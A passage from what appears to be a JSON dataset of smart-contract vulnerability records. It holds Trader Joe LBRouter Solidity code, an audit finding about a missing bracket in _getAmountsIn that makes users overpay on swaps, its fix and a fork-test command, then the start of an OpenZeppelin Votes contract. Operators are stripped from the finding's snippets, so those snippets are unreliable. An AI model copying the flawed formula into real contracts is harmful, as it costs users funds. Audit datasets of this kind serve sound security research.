(_amountOutMinAVAX > amountOut) revert LBRouter__InsufficientAmountOut(_amountOutMinAVAX, amountOut);\n\n        wavax.withdraw(amountOut);\n        _safeTransferAVAX(_to, amountOut);\n    }\n\n    /// @notice Swaps exact AVAX for tokens while performing safety checks supporting for fee on transfer tokens\n    /// @param _amountOutMin The min amount of token to receive\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountOut Output amount of the swap\n    function swapExactAVAXForTokensSupportingFeeOnTransferTokens(\n        uint256 _amountOutMin,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to,\n        uint256 _deadline\n    ) external payable override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256 amountOut) {\n        if (_tokenPath[0] != IERC20(wavax)) revert LBRouter__InvalidTokenPath(address(_tokenPath[0]));\n\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n\n        IERC20 _targetToken = _tokenPath[_pairs.length];\n\n        uint256 _balanceBefore = _targetToken.balanceOf(_to);\n\n        _wavaxDepositAndTransfer(_pairs[0], msg.value);\n\n        _swapSupportingFeeOnTransferTokens(_pairs, _pairBinSteps, _tokenPath, _to);\n\n        amountOut = _targetToken.balanceOf(_to) - _balanceBefore;\n        if (_amountOutMin > amountOut) revert LBRouter__InsufficientAmountOut(_amountOutMin, amountOut);\n    }\n\n    /// @notice Unstuck tokens that are sent to this contract by mistake\n    /// @dev Only callable by the factory owner\n    /// @param _token The address of the token\n    /// @param _to The address of the user to send back the tokens\n    /// @param _amount The amount to send\n    function sweep(\n        IERC20 _token,\n        address _to,\n        uint256 _amount\n    ) external override onlyFactoryOwner {\n        if (address(_token) == address(0)) {\n            if (_amount == type(uint256).max) _amount = address(this).balance;\n            _safeTransferAVAX(_to, _amount);\n        } else {\n            if (_amount == type(uint256).max) _amount = _token.balanceOf(address(this));\n            _token.safeTransfer(_to, _amount);\n        }\n    }\n\n    /// @notice Unstuck LBTokens that are sent to this contract by mistake\n    /// @dev Only callable by the factory owner\n    /// @param _lbToken The address of the LBToken\n    /// @param _to The address of the user to send back the tokens\n    /// @param _ids The list of token ids\n    /// @param _amounts The list of amounts to send\n    function sweepLBToken(\n        ILBToken _lbToken,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _amounts\n    ) external override onlyFactoryOwner {\n        _lbToken.safeBatchTransferFrom(address(this), _to, _ids, _amounts);\n    }\n\n    /// @notice Helper function to add liquidity\n    /// @param _liq The liquidity parameter\n    /// @param _LBPair LBPair where liquidity is deposited\n    /// @return depositIds Bin ids where the liquidity was actually deposited\n    /// @return liquidityMinted Amounts of LBToken minted for each bin\n    function _addLiquidity(LiquidityParameters memory _liq, ILBPair _LBPair)\n        private\n        ensure(_liq.deadline)\n        returns (uint256[] memory depositIds, uint256[] memory liquidityMinted)\n    {\n        unchecked {\n            if (_liq.deltaIds.length != _liq.distributionX.length && _liq.deltaIds.length != _liq.distributionY.length)\n                revert LBRouter__LengthsMismatch();\n\n            if (_liq.activeIdDesired > type(uint24).max || _liq.idSlippage > type(uint24).max)\n                revert LBRouter__IdDesiredOverflows(_liq.activeIdDesired, _liq.idSlippage);\n\n            (, , uint256 _activeId) = _LBPair.getReservesAndId();\n            if (\n                _liq.activeIdDesired + _liq.idSlippage < _activeId || _activeId + _liq.idSlippage < _liq.activeIdDesired\n            ) revert LBRouter__IdSlippageCaught(_liq.activeIdDesired, _liq.idSlippage, _activeId);\n\n            depositIds = new uint256[](_liq.deltaIds.length);\n            for (uint256 i; i < depositIds.length; ++i) {\n                int256 _id = int256(_activeId) + _liq.deltaIds[i];\n                if (_id < 0 || uint256(_id) > type(uint24).max) revert LBRouter__IdOverflows(_id);\n                depositIds[i] = uint256(_id);\n            }\n\n            uint256 _amountXAdded;\n            uint256 _amountYAdded;\n\n            (_amountXAdded, _amountYAdded, liquidityMinted) = _LBPair.mint(\n                depositIds,\n                _liq.distributionX,\n                _liq.distributionY,\n                _liq.to\n            );\n\n            if (_amountXAdded < _liq.amountXMin || _amountYAdded < _liq.amountYMin)\n                revert LBRouter__AmountSlippageCaught(_liq.amountXMin, _amountXAdded, _liq.amountYMin, _amountYAdded);\n        }\n    }\n\n    /// @notice Helper function to return the amounts in\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _pairs The list of pairs\n    /// @param _tokenPath The swap path\n    /// @param _amountOut The amount out\n    /// @return amountsIn The list of amounts in\n    function _getAmountsIn(\n        uint256[] memory _pairBinSteps,\n        address[] memory _pairs,\n        IERC20[] memory _tokenPath,\n        uint256 _amountOut\n    ) private view returns (uint256[] memory amountsIn) {\n        amountsIn = new uint256[](_tokenPath.length);\n        // Avoid doing -1, as `_pairs.length == _pairBinSteps.length-1`\n        amountsIn[_pairs.length] = _amountOut;\n\n        for (uint256 i = _pairs.length; i != 0; i--) {\n            IERC20 _token = _tokenPath[i - 1];\n            uint256 _binStep = _pairBinSteps[i - 1];\n\n            address _pair = _pairs[i - 1];\n\n            if (_binStep == 0) {\n                (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();\n                if (_token > _tokenPath[i]) {\n                    (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);\n                }\n\n                uint256 amountOut_ = amountsIn[i];\n                // Legacy uniswap way of rounding\n                amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1;\n            } else {\n                (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);\n            }\n        }\n    }\n\n    /// @notice Helper function to remove liquidity\n    /// @param _LBPair The address of the LBPair\n    /// @param _amountXMin The min amount to receive of token X\n    /// @param _amountYMin The min amount to receive of token Y\n    /// @param _ids The list of ids to burn\n    /// @param _amounts The list of amounts to burn of each id in `_ids`\n    /// @param _to The address of the recipient\n    /// @param amountX The amount of token X sent by the pair\n    /// @param amountY The amount of token Y sent by the pair\n    function _removeLiquidity(\n        ILBPair _LBPair,\n        uint256 _amountXMin,\n        uint256 _amountYMin,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        address _to\n    ) private returns (uint256 amountX, uint256 amountY) {\n        ILBToken(address(_LBPair)).safeBatchTransferFrom(msg.sender, address(_LBPair), _ids, _amounts);\n        (amountX, amountY) = _LBPair.burn(_ids, _amounts, _to);\n        if (amountX < _amountXMin || amountY < _amountYMin)\n            revert LBRouter__AmountSlippageCaught(_amountXMin, amountX, _amountYMin, amountY);\n    }\n\n    /// @notice Helper function to swap exact tokens for tokens\n    /// @param _amountIn The amount of token sent\n    /// @param _pairs The list of pairs\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @return amountOut The amount of token sent to `_to`\n    function _swapExactTokensForTokens(\n        uint256 _amountIn,\n        address[] memory _pairs,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to\n    ) private returns (uint256 amountOut) {\n        IERC20 _token;\n        uint256 _binStep;\n        address _recipient;\n        address _pair;\n\n        IERC20 _tokenNext = _tokenPath[0];\n        amountOut = _amountIn;\n\n        unchecked {\n            for (uint256 i; i < _pairs.length; ++i) {\n                _pair = _pairs[i];\n                _binStep = _pairBinSteps[i];\n\n                _token = _tokenNext;\n                _tokenNext = _tokenPath[i + 1];\n\n                _recipient = i + 1 == _pairs.length ? _to : _pairs[i + 1];\n\n                if (_binStep == 0) {\n                    (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n\n                    if (_token < _tokenNext) {\n                        amountOut = (_reserve1 * amountOut * 997) / (_reserve0 * 1_000 + amountOut * 997);\n                        IJoePair(_pair).swap(0, amountOut, _recipient, \"\");\n                    } else {\n                        amountOut = (_reserve0 * amountOut * 997) / (_reserve1 * 1_000 + amountOut * 997);\n                        IJoePair(_pair).swap(amountOut, 0, _recipient, \"\");\n                    }\n                } else {\n                    bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();\n\n                    (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);\n\n                    if (_swapForY) amountOut = _amountYOut;\n                    else amountOut = _amountXOut;\n                }\n            }\n        }\n    }\n\n    /// @notice Helper function to swap tokens for exact tokens\n    /// @param _pairs The array of pairs\n    /// @param _pairBinSteps The versions of each pair (1: DexV1, 2: dexV2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _amountsIn The list of amounts in\n    /// @param _to The address of the recipient\n    /// @return amountOut The amount of token sent to `_to`\n    function _swapTokensForExactTokens(\n        address[] memory _pairs,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        uint256[] memory _amountsIn,\n        address _to\n    ) private returns (uint256 amountOut) {\n        IERC20 _token;\n        uint256 _binStep;\n        address _recipient;\n        address _pair;\n\n        IERC20 _tokenNext = _tokenPath[0];\n\n        unchecked {\n            for (uint256 i; i < _pairs.length; ++i) {\n                _pair = _pairs[i];\n                _binStep = _pairBinSteps[i];\n\n                _token = _tokenNext;\n                _tokenNext = _tokenPath[i + 1];\n\n                _recipient = i + 1 == _pairs.length ? _to : _pairs[i + 1];\n\n                if (_binStep == 0) {\n                    amountOut = _amountsIn[i + 1];\n                    if (_token < _tokenNext) {\n                        IJoePair(_pair).swap(0, amountOut, _recipient, \"\");\n                    } else {\n                        IJoePair(_pair).swap(amountOut, 0, _recipient, \"\");\n                    }\n                } else {\n                    bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();\n\n                    (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);\n\n                    if (_swapForY) amountOut = _amountYOut;\n                    else amountOut = _amountXOut;\n                }\n            }\n        }\n    }\n\n    /// @notice Helper function to swap exact tokens supporting for fee on transfer tokens\n    /// @param _pairs The list of pairs\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    function _swapSupportingFeeOnTransferTokens(\n        address[] memory _pairs,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to\n    ) private {\n        IERC20 _token;\n        uint256 _binStep;\n        address _recipient;\n        address _pair;\n\n        IERC20 _tokenNext = _tokenPath[0];\n\n        unchecked {\n            for (uint256 i; i < _pairs.length; ++i) {\n                _pair = _pairs[i];\n                _binStep = _pairBinSteps[i];\n\n                _token = _tokenNext;\n                _tokenNext = _tokenPath[i + 1];\n\n                _recipient = i + 1 == _pairs.length ? _to : _pairs[i + 1];\n\n                if (_binStep == 0) {\n                    (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n                    if (_token < _tokenNext) {\n                        uint256 _balance = _token.balanceOf(_pair);\n                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);\n\n                        IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");\n                    } else {\n                        uint256 _balance = _token.balanceOf(_pair);\n                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);\n\n                        IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");\n                    }\n                } else {\n                    ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient);\n                }\n            }\n        }\n    }\n\n    /// @notice Helper function to return the address of the LBPair\n    /// @dev Revert if the pair is not created yet\n    /// @param _tokenX The address of the tokenX\n    /// @param _tokenY The address of the tokenY\n    /// @param _binStep The bin step of the LBPair\n    /// @return The address of the LBPair\n    function _getLBPairInformation(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint256 _binStep\n    ) private view returns (ILBPair) {\n        ILBPair _LBPair = factory.getLBPairInformation(_tokenX, _tokenY, _binStep).LBPair;\n        if (address(_LBPair) == address(0))\n            revert LBRouter__PairNotCreated(address(_tokenX), address(_tokenY), _binStep);\n        return _LBPair;\n    }\n\n    /// @notice Helper function to return the address of the pair (v1 or v2, according to `_binStep`)\n    /// @dev Revert if the pair is not created yet\n    /// @param _binStep The bin step of the LBPair, 0 means using V1 pair, any other value will use V2\n    /// @param _tokenX The address of the tokenX\n    /// @param _tokenY The address of the tokenY\n    /// @return _pair The address of the pair of binStep `_binStep`\n    function _getPair(\n        uint256 _binStep,\n        IERC20 _tokenX,\n        IERC20 _tokenY\n    ) private view returns (address _pair) {\n        if (_binStep == 0) {\n            _pair = oldFactory.getPair(address(_tokenX), address(_tokenY));\n            if (_pair == address(0)) revert LBRouter__PairNotCreated(address(_tokenX), address(_tokenY), _binStep);\n        } else _pair = address(_getLBPairInformation(_tokenX, _tokenY, _binStep));\n    }\n\n    function _getPairs(uint256[] memory _pairBinSteps, IERC20[] memory _tokenPath)\n        private\n        view\n        returns (address[] memory pairs)\n    {\n        pairs = new address[](_pairBinSteps.length);\n\n        IERC20 _token;\n        IERC20 _tokenNext = _tokenPath[0];\n        unchecked {\n            for (uint256 i; i < pairs.length; ++i) {\n                _token = _tokenNext;\n                _tokenNext = _tokenPath[i + 1];\n\n                pairs[i] = _getPair(_pairBinSteps[i], _token, _tokenNext);\n            }\n        }\n    }\n\n    /// @notice Helper function to transfer AVAX\n    /// @param _to The address of the recipient\n    /// @param _amount The AVAX amount to send\n    function _safeTransferAVAX(address _to, uint256 _amount) private {\n        (bool success, ) = _to.call{value: _amount}(\"\");\n        if (!success) revert LBRouter__FailedToSendAVAX(_to, _amount);\n    }\n\n    /// @notice Helper function to deposit and transfer wavax\n    /// @param _to The address of the recipient\n    /// @param _amount The AVAX amount to wrap\n    function _wavaxDepositAndTransfer(address _to, uint256 _amount) private {\n        wavax.deposit{value: _amount}();\n        wavax.safeTransfer(_to, _amount);\n    }\n}\n\n\n",
        "CodeNames": [
            "demo.sol",
            "LBQuoter.sol",
            "IJoeFactory.sol",
            "WizardControlFirstPriority.sol",
            "LBErrors.sol",
            "LBPair.sol",
            "LBRouter.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "//solidity\nif (_binStep == 0) {\n    (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();\n    if (_token  _tokenPath[i]) {\n        (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);\n    }\n\n\n    uint256 amountOut_ = amountsIn[i];\n    // Legacy uniswap way of rounding\n    amountsIn[i 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut amountOut_ * 997) + 1;\n} else {\n    (amountsIn[i 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);\n}\n",
                    "\n\n        rIn * rOut = (rIn + amountInDeductFee) * (rOut amountOut_)\n    == rIn + amountInDeductFee = rIn * rOut / (rOut amountOut_) + 1\n    <= amountInDeductFee = (rIn * rOut) / (rOut amountOut_) rIn + 1\n    <= rAmountIn * 0.997 = rIn * amountOut / (rOut amountOut_) + 1\n    <= rAmountIn = (rIn * amountOut * 1000) / ((rOut amountOut_) * 997) + 1\n    <= \n",
                    "//solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L440\n    amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);\n    ",
                    "//solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L444\n    _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);\n    ",
                    "//solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L446    \n    uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);\n    ",
                    "//solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841\n    amountOut = _amountsIn[i + 1];\n    ",
                    "\nforge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv\n"
                ],
                "Type": " Wrong calculation in function  LBRouter._getAmountsIn  make user lose a lot of tokens when swap through JoePair (most of them will gifted to JoePair freely)",
                "Description": "*Submitted by KIntern_NA(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400), also found by hansfriese(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/442), Jeiwan(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/341), and cccz(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/88)*\n\nFunction LBRouter._getAmountsIn is a helper function to return the amounts in with given amountOut. This function will check the pair of _token and _tokenNext is JoePair or LBPair using _binStep.\n\n*   If _binStep == 0, it will be a JoePair otherwise it will be an LBPair.\n\nsolidity\nif (_binStep == 0) {\n    (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();\n    if (_token  _tokenPath[i]) {\n        (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);\n    }\n\n\n    uint256 amountOut_ = amountsIn[i];\n    // Legacy uniswap way of rounding\n    amountsIn[i 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut amountOut_ * 997) + 1;\n} else {\n    (amountsIn[i 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);\n}\n\n\nAs we can see when _binStep == 0 and _token < _tokenPath[i] (in another word  we swap through JoePair and pair'stoken0 is _token and token1 is _tokenPath[i]), it will\n\n1.  Get the reserve of pair (reserveIn, reserveOut)\n2.  Calculate the _amountIn by using the formula\n\n<!----\n\n    amountsIn[i 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut amountOut_ * 997) + 1\n\nBut unfortunately the denominator _reserveOut amountOut_ * 997 seem incorrect. It should be (_reserveOut amountOut_) * 997.<br\nWe will do some math calculations here to prove the expression above is wrong.\n\nInput:\n\n*   _reserveIn (rIn): reserve of _token in pair\n*   _reserveOut (rOut): reserve of _tokenPath[i] in pair\n*   amountOut_: the amount of _tokenPath the user wants to gain\n\nOutput:\n\n*   rAmountIn: the actual amount of _token we need to transfer to the pair.\n\nGenerate Formula:\n\nCause JoePair takes 0.3%(https://help.traderjoexyz.com/en/welcome/faq-and-help/general-faq#what-are-trader-swap-joe-fees) of amountIn as fee, we get\n\n*   amountInDeductFee = amountIn' * 0.997\n\nFollowing the constant product formula(https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/glossary#constant-product-formula), we have\n\n\n        rIn * rOut = (rIn + amountInDeductFee) * (rOut amountOut_)\n    == rIn + amountInDeductFee = rIn * rOut / (rOut amountOut_) + 1\n    <= amountInDeductFee = (rIn * rOut) / (rOut amountOut_) rIn + 1\n    <= rAmountIn * 0.997 = rIn * amountOut / (rOut amountOut_) + 1\n    <= rAmountIn = (rIn * amountOut * 1000) / ((rOut amountOut_) * 997) + 1\n    <= \n\n\nAs we can see rAmountIn is different from amountsIn[i 1], the denominator of rAmountIn is (rOut amountOut_) * 997 when the denominator of amountsIn[i 1] is _reserveOut amountOut_ * 997 (Missing one bracket)\n\n\nLoss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.\n\nLet dive in the function swapTokensForExactTokens() to figure out why this scenario happens. I will assume I just swap through only one pool from JoePair and 0 pool from LBPair.\n\n*   Firstly function will get the list amountsIn from function _getAmountsIn. So amountsIn will be [incorrectAmountIn, userDesireAmount].\n    solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L440\n    amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);\n    \n*   Then it transfers incorrectAmountIn to _pairs[0] to prepare for the swap.\n    solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L444\n    _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);\n    \n*   Finally it calls function _swapTokensForExactToken to execute the swap.\n    solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L446    \n    uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);\n    \n    In this step it will reach to line 841(https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841) which will set the expected amountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount.\n    solidity\n    // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841\n    amountOut = _amountsIn[i + 1];\n    \n    So after calling IJoePair(_pair).swap(), the user just gets exactly amountOut and wastes a lot of tokenIn that (s)he transfers to the pool.\n\n\nHere is our test script to describe the impacts\n\n*   <https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4\n\nYou can place this file into /test folder and run it using\n\n\nforge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv\n\n\nExplanation of test script: (For more detail you can read the comments from test script above)\n\n1. Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory.\n2. At the forked block, price WAVAX/USDC was around 15.57. We try to use LBRouter function swapTokensForExactTokens to swap 10$ WAVAX (10e18 wei) to 1$ USDC (1e6 wei). But it reverts with the error LBRouter__MaxAmountInExceeded. But when we swap directly to JoePair, it swap successfully 10$ AVAX (10e18 wei) to 155$ USDC (155e6 wei).\n3. We use LBRouter function swapTokensForExactTokens again with very large amountInMax to swap 1$ USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).\n\n\nFoundry\n\n",
                "Repair": "\nModify function LBRouter._getAmountsIn as follow\n\nsolidity\n// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L717-L728\nif (_binStep == 0) {\n    (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();\n    if (_token  _tokenPath[i]) {\n        (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);\n    }\n\n\n    uint256 amountOut_ = amountsIn[i];\n    // Legacy uniswap way of rounding\n    // Fix here \n    amountsIn[i 1] = (_reserveIn * amountOut_ * 1_000) / ((_reserveOut amountOut_) * 997) + 1;\n} else {\n    (amountsIn[i 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);\n}\n\n\n0x0Louis (Trader Joe) confirmed(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/400#issuecomment-1309002772):\n  The warden has shown how, due to an incorrect order of operation, the math for the router will be incorrect.\n \n While the error could be considered a typo, the router is the designated proper way of performing a swap, and due to this finding, the math will be off.\n \n Because the impact shows an incorrect logic, and a broken invariant (the router uses incorrect amounts, sometimes reverting, sometimes costing the end user more tokens than necessary), I believe High Severity to be appropriate.\n \n Mitigation will require refactoring and may be aided by the test case offered in this report.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (governance/utils/Votes.sol)\npragma solidity ^0.8.0;\n\nimport \"../../utils/Context.sol\";\nimport \"../../utils/Counters.sol\";\nimport \"../../utils/Checkpoints.sol\";\nimport \"../../utils/cryptography/draft-EIP712.sol\";\nimport \"./IVotes.sol\";\n\n/**\n * @dev This is a base abstract contract that tracks voting units, which are a measure of voting power that can be\n * transferred, and provides a system of vote delegation, where an account can delegate its voting units to a sort of\n * \"representative\" that will pool delegated voting units from different accounts and can then use it to vote in\n * decisions. In fact, voting units _must_ be delegated in order to count as actual votes, and an account has to\n * delegate those votes to itself if it wishes to participate in decisions and does not have a trusted representative.\n *\n * This contract is often combined with a token contract such that voting units correspond to token units. For an\n * example, see {ERC721Votes}.\n *\n * The full history of delegate votes is tracked on-chain so that governance protocols can consider votes as distributed\n * at a particular block number to protect against flash loans and double voting. The opt-in delegate system makes the\n * cost of this history tracking optional.\n *\n * When using this module the derived contract must implement {_getVotingUnits} (for example, make it return\n * {ERC721-balanceOf}), and can use {_transferVotingUnits} to track a change in the distribution of those units (in the\n * previous example, it would be included in {ERC721-_beforeTokenTransfer}).\n *\n * _Available since v4.5._\n */\nabstract contract Votes is IVotes, Context, EIP712 {\n    using Checkpoints for Checkpoints.History;\n    using Counters for Counters.Counter;\n\n    bytes32 private constant _DELEGATION_TYPEHASH =\n        keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n\n    mapping(address => address) private _delegation;\n    mapping(address => Checkpoints.History) private _delegateCheckpoints;\n    Checkpoints.History private _totalCheckpoints;\n\n    mapping(address => Counters.Counter) private _nonces;\n\n    /**\n     * @dev Returns the current amount of votes that `account` has.\n     */\n    function getVotes(address account) public view virtual override returns (uint256) {\n        return _delegateCheckpoints[account].latest();\n    }\n\n    /**\n     * @dev Returns the amount of votes that `account` had at the end of a past block (`blockNumber`).\n     *\n     * Requirements:\n     *\n     * - `blockNumber` must have been already mined\n     */\n    function getPastVotes(address account, uint256 blockNumber) public view virtual override returns (uint256) {\n        return _delegateCheckpoints[account].getAtBlock(blockNumber);\n    }\n\n    /**\n     * @dev Returns the total supply of votes available at the end of a past block (`blockNumber`).\n     *\n     * NOTE: This value is the sum of all available votes, which is not necessarily the sum of all delegated votes.\n     * Votes that have not been delegated are still part of total supply, even though they would not participate in a\n     * vote.\n     *\n     * Requirements:\n     *\n     * - `blockNumber` must have been already mined\n     */\n    function getPastTotalSupply(uint256 blockNumber) public view virtual override returns (uint256) {\n        require(blockNumber < block.number, \"Votes: block not yet mined\");\n        return _totalCheckpoints.getAtBlock(blockNumber);\n    }\n\n    /**\n     * @dev Returns the current total supply of votes.\n     */\n    function _getTotalSupply() internal view virtual returns (uint256) {\n        return _totalCheckpoints.latest();\n    }\n\n    /**\n     * @dev Returns the delegate that `account` has chosen.\n     */\n    function delegates(address account) public view virtual override returns (address) {\n        return _delegation[account];\n    }\n\n    /**\n     * @dev Delegates votes from the sender to `delegatee`.\n     */\n    function delegate(address delegatee) public virtual override {\n        address account = _msgSender();\n        _delegate(account, delegatee);\n    }\n\n    /**\n     * @dev Delegates votes from signer to `delegatee`.\n     */\n    function delegateBySig(\n        address delegatee,\n        uint256 nonce,\n        uint256 expiry,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual override {\n        require(block.timestamp <= expiry, \"Votes: signature expired\");\n        address signer = ECDSA.recover(\n            _hashTypedDataV4(keccak256(abi.encode(_DELEGATION_TYPEHASH, delegatee, nonce, expiry))),\n            v,\n            r,\n            s\n        );\n        require(nonce == _useNonce(signer), \"Votes: invalid nonce\");\n        _delegate(signer, delegatee);\n    }\n\n    /**\n     * @dev Delegate all of `account`'s voting units to `delegatee`.\n     *\n     * Emits events {DelegateChanged} and {DelegateVotesChanged}.\n     */\n    function _delegate(address account, address delegatee) internal virtual {\n        address oldDelegate = delegates(account);\n        _delegation[account] = delegatee;\n\n        emit DelegateChanged(account, oldDelegate, delegatee);\n        _moveDelegateVotes(oldDelegate, delegatee, _getVotingUnits(account));\n    }\n\n    /**\n     * @dev Transfers, mints, or burns voting units. To register a mint, `from` should be zero. To register a burn, `to`\n     * should be zero. Total supply of voting units will be adjusted with mints and burns.\n     */\n    function _transferVotingUnits(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        if (from == address(0)) {\n            _totalCheckpoints.push(_add, amount);\n        }\n        if (to == address(0)) {\n            _totalCheckpoints.push(_subtract, amount);\n        }\n        _moveDelegateVotes(delegates(from), delegates(to), amount);\n    }\n\n    /**\n     * @dev Moves delegated votes from one delegate to another.\n     */\n    function _moveDelegateVotes(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        if (from != to && amount > 0) {\n            if (from != address(0)) {\n                (uint256 oldValue, uint256 newValue) = _delegateCheckpoints[from].push(_subtract, amount);\n                emit DelegateVotesChanged(from, oldValue, newValue);\n            }\n            if (to != address(0)) {\n                (uint256 oldValue, uint256 newValue) = _delegateCheckpoints[to].push(_add, amount);\n                emit DelegateVotesChanged(to, oldValue, newValue);\n            }\n        }\n    }\n\n    function _add(uint256 a, uint256 b) private pure returns (uint256) {\n        return a + b;\n    }\n\n    function _subtract(uint256 a, uint256 b) private pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * @dev Consumes a nonce.\n     *\n     * Returns the current value and increments nonce.\n     */\n    function _useNonce(address owner) internal virtual returns (uint256 current) {\n        Counters.Counter storage nonce = _nonces[owner];\n        current = nonce.current();\n        nonce.increment();\n    }\n\n    /**\n     * @dev Returns an address nonce.\n     */\n    function nonces(address owner) public view virtual returns (uint256) {\n        return _nonces[owner].current();\n    }\n\n    /**\n     * @dev Returns the contract's {EIP712} domain separator.\n     */\n    // solhint-disable-next-line func-name-mixedcase\n    function DOMAIN_SEPARATOR() external view returns (bytes32) {\n        return _domainSeparatorV4();\n    }\n\n    /**\n     * @dev Must return the voting units held by an account.\n     */\n    function _getVotingUnits(address) internal view 